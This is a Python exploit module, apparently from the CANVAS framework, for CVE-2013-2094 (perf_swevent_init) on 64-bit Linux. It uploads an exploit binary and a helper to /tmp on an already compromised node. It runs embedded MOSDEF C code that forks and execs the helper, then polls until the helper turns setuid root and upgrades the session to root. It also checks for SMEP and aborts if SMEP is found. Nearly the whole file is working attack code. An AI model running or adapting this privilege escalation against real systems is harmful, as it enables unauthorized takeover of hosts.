#!/usr/bin/env python

import sys
import time

from exploitutils import *
from canvaserror import *

from canvasexploit import canvasexploit
from ExploitTypes.linuxLocalExploit import LinuxLocalExploit

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'perf_swevent_init local root'
DESCRIPTION                     = 'Elevate MOSDEF Node privileges through CVE-2013-2094'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'GNU/Linux'
DOCUMENTATION['Repeatability']  = 'Infinite'
DOCUMENTATION['CVE Name']       = 'CVE-2013-2094'
DOCUMENTATION['CVE Url']        = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2094'

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [['Linux', 'x64']]

DOCUMENTATION['Notes'] = """

Tested on:
- Ubuntu 12.10 quantal x86_64 3.5.0-27-generic

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.lx             = 'exploits/perf_swevent_init/Resources/x' # local path exploit
        self.lh             = 'exploits/perf_swevent_init/Resources/h' # local path helper
        self.remote_exp     = '/tmp/x' # remote path exploit
        self.remote_helper  = '/tmp/h' # remote path helper

    def execveHelper(self, wait = 0):
        lvars = {}
        lvars['ENV_XP'] = 'ENV_XP=%s' % self.dx
        lvars['HELPER'] = self.dh
        lvars['MOSDEF'] = '%d' % self.node.shell.fd
        lvars['WAIT'] = wait

        code = """
        #import "string", "ENV_XP" as "ENV_XP"
        #import "string", "HELPER" as "HELPER"
        #import "string", "MOSDEF" as "MOSDEF"

        #import "int", "WAIT" as "WAIT"

        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            char *argv[3];
            char *env[2];
            int pid;

            argv[0] = HELPER;
            argv[1] = MOSDEF;
            argv[2] = NULL;

            env[0] = ENV_XP;
            env[1] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, env);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """
        ret = self.node.shell.runCode(code, lvars)
        self.log('[+] execve helper ret: %d ...' % ret)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]

        if not self.is_linux_node():
            return False

        if not self.is_64bit_node():
            return False

        if self.check_smep():
            self.log_info('Found SMEP on target host')
            self.log_error('Aborting')
            return False

        stat = self.statFile(self.dh)
        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
            self.nlog('Already compromised ... initing elevated MOSDEF loop')
            self.execveHelper(wait = 1)

            self.init_mosdef_upgrade()
            self.cleanup()
            return True

        self.log('[+] uploading helper and exploit ...')
        if self.nodeUpload(self.lx, self.dx) == False:
            return False
        if self.nodeUpload(self.lh, self.dh) == False:
            return False

        self.log('[+] executing helper ...')
        self.execveHelper()

        # snooze is set to 20 in helper, average race is won in 10 secs
        i = 30
        while i:
            self.log('[+] checking helper mode ...')
            stat = self.statFile(self.dh)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                self.log('[+] compromised ... initing elevated MOSDEF loop')
                self.execveHelper(wait = 1)

                self.init_mosdef_upgrade()
                self.cleanup()
                break
            i -= 1
            time.sleep(1)
        if not i:
            self.log('[+] looks like we failed, try again!')
            self.cleanup()
            return False

        return True
